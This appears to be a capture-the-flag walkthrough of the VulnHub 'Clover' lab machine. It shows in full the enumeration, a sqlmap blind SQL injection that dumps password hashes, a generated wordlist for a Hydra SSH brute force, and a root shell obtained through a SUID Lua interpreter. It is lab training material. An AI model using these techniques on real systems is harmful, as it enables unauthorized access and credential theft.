# Walkthrough VULNHUB --> CLOVER

### Thanks to my friend 0xJin for this funny machine

First step is to scan our Netwok to find the machine IP, in my case the host has ip 192.168.1.53.

We use nmap to scan the target machine with the command:

```bash
nmap -sC -sV -p- 192.168.1.53
```

```bash
└─# nmap -sC -sV -p- 192.168.1.53
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 07:03 EDT
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 87.40% done; ETC: 07:04 (0:00:14 remaining)
Nmap scan report for Clover.homenet.telecomitalia.it (192.168.1.53)
Host is up (0.00059s latency).
Not shown: 65527 filtered ports
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Mar 26 16:49 maintenance
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open   ssh        OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 bc:a7:bf:7f:23:83:55:08:f7:d1:9a:92:46:c6:ad:2d (DSA)
|   2048 96:bd:c2:57:1c:91:7b:0a:b9:49:5e:7f:d1:37:a6:65 (RSA)
|   256 b9:d9:9d:58:b8:5c:61:f2:36:d9:b2:14:e8:00:3c:05 (ECDSA)
|_  256 24:29:65:28:6e:fa:07:6a:f1:6b:fa:07:a0:13:1b:b6 (ED25519)
80/tcp   open   http       Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries
|_/admin /root /webmaster
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
110/tcp  closed pop3
443/tcp  closed https
5781/tcp closed 3par-evts
8080/tcp closed http-proxy
MAC Address: 08:00:27:30:93:F3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Opening the website on the port 80:
![80](./clover/80.PNG?raw=true "port 80")

Let's run a scan with godirb:

```bash
┌──(animale㉿kali)-[~]
└─$ gobuster dir -t 50 --url http://192.168.1.53 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,js,txt,html                       130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.53
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,txt,html,php
[+] Timeout:                 10s
===============================================================
2021/06/15 07:07:38 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 3]
/status               (Status: 200) [Size: 10]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.53/javascript/]
/website              (Status: 301) [Size: 314] [--> http://192.168.1.53/website/]
/robots.txt           (Status: 200) [Size: 105]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.1.53/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/06/15 07:12:09 Finished
===============================================================

```

Let's see everything:

- /index.html, /status and /javascript don't give us anything.

- /website load a template and using the inspector we don't find anything interesting

- /robots.txt return as follow:

```
User-agent: *
Allow: /status
Allow: /status-admin

Disallow: /admin
Disallow: /root
Disallow: /webmaster
```

- /phpmyadmin return the phpMyAdmin login

Nothing really usefull there!!!

Let's try to connect to ftp as anonymous

```bash
┌──(root💀kali)-[~]
└─# mkdir /tmp/clover

┌──(root💀kali)-[~]
└─# cd /tmp/clover

┌──(root💀kali)-[/tmp/clover]
└─# ftp 192.168.1.53
Connected to 192.168.1.53.
220 (vsFTPd 3.0.2)
Name (192.168.1.53:animale): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We can get in the ftp server, now we have to explore it...

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 26 16:49 maintenance
226 Directory send OK.
ftp> pwd
257 "/"
ftp> cd maintenance
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            13 Mar 26 16:48 locale.txt
-rw-r--r--    1 ftp      ftp             3 Mar 26 16:47 test.txt
-rw-r--r--    1 ftp      ftp            54 Mar 26 16:49 test2.txt
226 Directory send OK.
```

Let's download those files and see what is inside

```bash
ftp> mget *
mget locale.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locale.txt (13 bytes).
226 Transfer complete.
13 bytes received in 0.01 secs (1.3813 kB/s)
mget test.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (3 bytes).
226 Transfer complete.
3 bytes received in 0.05 secs (0.0649 kB/s)
mget test2.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test2.txt (54 bytes).
226 Transfer complete.
54 bytes received in 0.04 secs (1.1902 kB/s)
```

On our local machine, we navigate into the folder were data have been downloaded and open them.

```bash

┌──(root💀kali)-[/tmp/clover]
└─# ll
total 12
-rw-r--r-- 1 root root 13 Jun 15 07:33 locale.txt
-rw-r--r-- 1 root root 54 Jun 15 07:33 test2.txt
-rw-r--r-- 1 root root  3 Jun 15 07:33 test.txt

┌──(root💀kali)-[/tmp/clover]
└─# cat locale.txt
cGluZyBwb25n

┌──(root💀kali)-[/tmp/clover]
└─# cat test2.txt
We are under test.
Plese delete FTP anonymous login.

┌──(root💀kali)-[/tmp/clover]
└─# cat test.txt
OK

┌──(root💀kali)-[/tmp/clover]
└─# cat locale.txt| base64 -d
ping pong
```

It doesn't seems really helpful... Maybe we need a more advanced scan...

I tried to re-run gobuster using a different wordlist

```bash
┌──(root💀kali)-[/tmp/clover]
└─# gobuster dir --url http://192.168.1.53 --wordlist /usr/share/seclists/Discovery/Web-Content/dirsearch.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.53
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/15 07:58:14 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 3]
/.htaccess-marco      (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess-dev        (Status: 403) [Size: 277]
/.htaccess-local      (Status: 403) [Size: 277]
/.htaccess.save       (Status: 403) [Size: 277]
/.htaccess.inc        (Status: 403) [Size: 277]
/.htaccess.sample     (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htaccess/           (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.htaccessOLD         (Status: 403) [Size: 277]
/.htaccess.bak1       (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htaccessBAK         (Status: 403) [Size: 277]
/.htaccess.orig       (Status: 403) [Size: 277]
/.htpasswd.inc        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd-old        (Status: 403) [Size: 277]
/.htpasswd/           (Status: 403) [Size: 277]
/.htaccessOLD2        (Status: 403) [Size: 277]
/.httr-oauth          (Status: 403) [Size: 277]
/.htpasswd.bak        (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.php3                (Status: 403) [Size: 277]
//                    (Status: 200) [Size: 3]
/CFIDE/               (Status: 200) [Size: 947]
/icons/               (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 3]
/javascript/          (Status: 403) [Size: 277]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.53/javascript/]
/phpmyadmin/          (Status: 200) [Size: 9166]
/robots.txt           (Status: 200) [Size: 105]
/status               (Status: 200) [Size: 10]
/website              (Status: 301) [Size: 314] [--> http://192.168.1.53/website/]
/website/             (Status: 200) [Size: 10013]
===============================================================
2021/06/15 07:58:16 Finished
===============================================================
```

There is a /CFIDE/ folder... Let's see what is inside

![CFIDE](./clover/CFIDE.PNG?raw=true "CFIDE")

When going in the /Administrator , another web page opens..

![Administrator](./clover/admin.PNG?raw=true "Administrator")

Nothin interesting in the page... Let's see in the code

![Code](./clover/code.PNG?raw=true "Code")

The only interesting thing is on line 123, about the login.php... Let's open it

![Login](./clover/login.PNG?raw=true "Login")

No possibility to use SQL injection...

Let's try blind sql injection with **sqlmap**...

```bash
┌──(root💀kali)-[/tmp/clover]
└─# sqlmap -u http://192.168.1.53/CFIDE/Administrator/login.php --data="uname=admin&passwd=admin" --level=5 --risk=3 --technique=b --dump                         130 ⨯
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:40:02 /2021-06-15/

[08:40:02] [INFO] resuming back-end DBMS 'mysql'
[08:40:02] [INFO] testing connection to the target URL
[08:40:02] [INFO] testing if the target URL content is stable
[08:40:03] [INFO] target URL content is stable
[08:40:03] [INFO] testing if POST parameter 'uname' is dynamic
[08:40:03] [WARNING] POST parameter 'uname' does not appear to be dynamic
[08:40:03] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[08:40:03] [INFO] testing for SQL injection on POST parameter 'uname'
[08:40:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:40:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[08:40:03] [INFO] POST parameter 'uname' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
[08:40:03] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[08:40:03] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-7441' OR 1714=1714-- FyAM&passwd=admin
---
[08:40:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[08:40:06] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[08:40:06] [INFO] fetching current database
[08:40:06] [INFO] resumed: clover
[08:40:06] [INFO] fetching tables for database: 'clover'
[08:40:06] [INFO] fetching number of tables for database 'clover'
[08:40:06] [INFO] resumed: 1
[08:40:06] [INFO] resumed: users
[08:40:06] [INFO] fetching columns for table 'users' in database 'clover'
[08:40:06] [INFO] resumed: 3
[08:40:06] [INFO] resumed: id
[08:40:06] [INFO] resumed: username
[08:40:06] [INFO] resumed: password
[08:40:06] [INFO] fetching entries for table 'users' in database 'clover'
[08:40:06] [INFO] fetching number of entries for table 'users' in database 'clover'
[08:40:06] [INFO] resumed: 3
[08:40:06] [INFO] resumed: 1
[08:40:06] [INFO] resumed: 33a41c7507cy5031d9tref6fdb31880c
[08:40:06] [INFO] resumed: 0xBush1do
[08:40:06] [INFO] resumed: 2
[08:40:06] [INFO] resumed: 69a41c7507ad7031d9decf6fdb31810c
[08:40:06] [INFO] resumed: asta
[08:40:06] [INFO] resumed: 3
[08:40:06] [INFO] resuming partial value: 92ift37507
[08:40:06] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[08:40:06] [INFO] retrieved: ad7y031d9decf98setf4w0c
[08:40:07] [INFO] retrieved: 0xJin
[08:40:07] [INFO] recognized possible password hashes in column 'password'
y
[08:40:19] [INFO] writing hashes to a temporary file '/tmp/sqlmap3zvo3nmo3336/sqlmaphashes-2t7fympv.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[08:40:28] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[08:40:38] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[08:40:44] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[08:40:44] [INFO] starting 2 processes
[08:41:23] [WARNING] no clear password(s) found
Database: clover
Table: users
[3 entries]
+----+----------------------------------+-----------+
| id | password                         | username  |
+----+----------------------------------+-----------+
| 1  | 33a41c7507cy5031d9tref6fdb31880c | 0xBush1do |
| 2  | 69a41c7507ad7031d9decf6fdb31810c | asta      |
| 3  | 92ift37507ad7031d9decf98setf4w0c | 0xJin     |
+----+----------------------------------+-----------+

[08:41:23] [INFO] table 'clover.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.1.53/dump/clover/users.csv'
[08:41:23] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.53'

[*] ending @ 08:41:23 /2021-06-15/

```

We know that **asta** is also a linux user... let's decrypt the password

![md5](./clover/md5.PNG?raw=true "MD5")

We got our password... Let's connect via ssh

```bash
┌──(root💀kali)-[/tmp/clover]
└─# ssh asta@192.168.1.53                                                                                                                                           2 ⨯
The authenticity of host '192.168.1.53 (192.168.1.53)' can't be established.
ECDSA key fingerprint is SHA256:vp8jT17uySkCt57MoYzE2c4wbuRUEnayBuruGKdCVwM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.53' (ECDSA) to the list of known hosts.
asta@192.168.1.53's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Wed Apr  7 08:38:41 2021 from desktop-f5mldm7
asta@Clover:~$
```

#### We're IN!!!!

Let's navigate and search for info....

```bash
asta@Clover:~$ ls -l
total 36
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Desktop
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Documents
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Downloads
-rw-r--r-- 1 root root  941 Mar 26 12:44 local.txt
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Music
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Pictures
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Public
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Templates
drwxr-xr-x 2 asta asta 4096 Apr  7 08:34 Videos
asta@Clover:~$ cat local.txt



                                |     |
                                \\_V_//
                                \/=|=\/
       Asta PWN!                 [=v=]
                               __\___/_____
                              /..[  _____  ]
                             /_  [ [  M /] ]
                            /../.[ [ M /@] ]
                           <-->[_[ [M /@/] ]
                          /../ [.[ [ /@/ ] ]
     _________________]\ /__/  [_[ [/@/ C] ]
    <_________________>>0---]  [=\ \@/ C / /
       ___      ___   ]/000o   /__\ \ C / /
          \    /              /....\ \_/ /
       ....\||/....           [___/=\___/
      .    .  .    .          [...] [...]
     .      ..      .         [___/ \___]
     .    0 .. 0    .         <---> <--->
  /\/\.    .  .    ./\/\      [..]   [..]
 / / / .../|  |\... \ \ \    _[__]   [__]_
/ / /       \/       \ \ \  [____>   <____]



34f35ca9ea7febe859be7715b707d684
```

Now let's search for other flags, otherwise we start check for privileges escalation.

```bash
asta@Clover:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
asta@Clover:~$ cd Desktop/
asta@Clover:~/Desktop$ ls
asta@Clover:~/Desktop$ cd ../Downloads/
asta@Clover:~/Downloads$ ll
-bash: ll: command not found
asta@Clover:~/Downloads$ cd ../Music/
asta@Clover:~/Music$ ll
-bash: ll: command not found
asta@Clover:~/Music$ ll ../Documents/
-bash: ll: command not found
asta@Clover:~/Music$ ls ../Documents/
asta@Clover:~/Music$ ls ../Pictures/
asta@Clover:~/Music$ ls ../Templates/
asta@Clover:~/Music$ ls ../Video
ls: cannot access ../Video: No such file or directory
asta@Clover:~/Music$ ls ../Videos/
asta@Clover:~/Music$ cd ../..
asta@Clover:/home$ pwd
/home
asta@Clover:/home$ ls
asta  sword
asta@Clover:/home$ cd sword
-bash: cd: sword: Permission denied
asta@Clover:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for asta:
Sorry, user asta may not run sudo on Clover.
asta@Clover:/home$ find / -perm -u=s 2>/dev/null
/sbin/mount.nfs
/bin/umount
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/mount
/usr/sbin/pppd
/usr/sbin/exim4
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/sudo
/usr/bin/at
/usr/bin/passwd
/usr/bin/X
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Let's find a way to escalate the privileges...

Searching on the machine I couldn't find anything, so I uploaded to the target machine linpeas via ssh

```bash
┌──(root💀kali)-[~animale]
└─# scp linpeas.sh asta@192.168.1.53:~/.
asta@192.168.1.53's password:
linpeas.sh
```

Let's run linpeas and read its results...

#### I found something interesting....

```bash
/var/backups/reminder/passwd.sword:passwd sword: P4SsW0rD****
```

Let's read the file...

```bash
asta@Clover:~$ cd /var/backups/reminder/
You have new mail in /var/mail/asta
asta@Clover:/var/backups/reminder$ ls
passwd.sword
asta@Clover:/var/backups/reminder$ cat passwd.sword
Oh well, this is a reminder for Sword's password. I just remember this:

passwd sword: P4SsW0rD****

I forgot the last four numerical digits!
asta@Clover:/var/backups/reminder$
```

At this stage, I created a simple python script to generate all the possible combinations between 0000 and 9999... here the script

```bash
┌──(root💀kali)-[~animale]
└─# vi script.py
```

```python
x = 0
while x < 10000:
    if x < 10:
        x = '000' + str(x)
    elif x >= 10 and x < 100:
        x = '00' + str(x)
    elif x >= 100 and x<1000:
        x='0'+str(x)
    with open('passwd.txt','a+') as f:
        f.write(f'P4SsW0rD{x}\n')
    x = int(x)+1
```

After run it, a passwd.txt file will be created...

I used hydra to brute-force the ssh

```bash
┌──(root💀kali)-[~animale]
└─# hydra -l sword -P passwd.txt 192.168.1.53 ssh -t 4 -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-15 09:37:24
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking ssh://192.168.1.53:22/
[STATUS] 427.67 tries/min, 1283 tries in 00:03h, 8818 to do in 00:21h, 50 active
[STATUS] 394.71 tries/min, 2763 tries in 00:07h, 7338 to do in 00:19h, 50 active
[STATUS] 394.71 tries/min, 2763 tries in 00:07h, 7338 to do in 00:19h, 50 active
[22][ssh] host: 192.168.1.53   login: sword   password: P4SsW0rD4286
```

#### PASSWORD FOUND!!!!

Let's connect via ssh...

```bash
┌──(root💀kali)-[~animale]
└─# ssh sword@192.168.1.53                                                                                                                                        255 ⨯
sword@192.168.1.53's password:
Permission denied, please try again.
sword@192.168.1.53's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar 26 17:34:16 2021 from kali
sword@Clover:~$
```

#### We're In!!

Let's find the flag

```bash
sword@Clover:~$ ls
local2.txt
sword@Clover:~$ ls -la
total 24
drwx------ 2 sword sword 4096 Mar 27 06:22 .
drwxr-xr-x 4 root  root  4096 Mar 24 14:49 ..
lrwxrwxrwx 1 root  root     9 Mar 27 06:22 .bash_history -> /dev/null
-rwx------ 1 sword sword  220 Mar 24 14:49 .bash_logout
-rwx------ 1 sword sword 3515 Mar 24 14:49 .bashrc
-rwx------ 1 sword sword  198 Mar 26 12:38 local2.txt
-rwx------ 1 sword sword  675 Mar 24 14:49 .profile
sword@Clover:~$ cat local2.txt





     /\
    // \
    || |
    || |
    || |      Sword PWN!
    || |
    || |
    || |
 __ || | __
/___||_|___\
     ww
     MM
    _MM_
   (&<>&)
    ~~~~




e63a186943f8c1258cd1afde7722fbb4
```

I think only root is missing but let's search for useful info..

Let's see if we have any sudo permission or there are suid programs we can use to escalate the privileges..

```bash
sword@Clover:~$ ls
local2.txt
sword@Clover:~$ sudo -l
[sudo] password for sword:
Sorry, user sword may not run sudo on Clover.
sword@Clover:~$ find / -perm -u=s 2>/dev/null
/sbin/mount.nfs
/bin/umount
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/mount
/usr/sbin/pppd
/usr/sbin/exim4
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/sudo
/usr/bin/at
/usr/bin/passwd
/usr/bin/X
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/games/clover/deamon.sh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
sword@Clover:~$
```

There is a script.. Let's read it

```bash
cat /usr/games/clover/deamon.sh
```

It's an executable!!!

Let's run it and see what it is..

```bash
sword@Clover:~$ /usr/games/clover/deamon.sh
Lua 5.2.3  Copyright (C) 1994-2013 Lua.org, PUC-Rio
>
```

It's Lua, a scripting language!!!! What if we try to execute the /bin/sh?

```bash
> os.execute('/bin/sh')
#
```

#### I love the **#**.... We have **root** privileges!!

Let's catch last flag...

```bash
# cd /root
# ls
proof.txt
# cat proof.txt




             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |  # whoami                               |    |
           |   |  # root                                 |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |     Congratulations You PWN Clover!     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |    974bd350558b912740f800a316c53afe     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/
                ___________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
:-------------------------------------------------------------------------:
`---._.-------------------------------------------------------------._.---'



// From 0xJin && 0xBush1do! If you root this, tag me on Twitter! @0xJin and @0xBush1do





# whoami
root
#
```

# Done
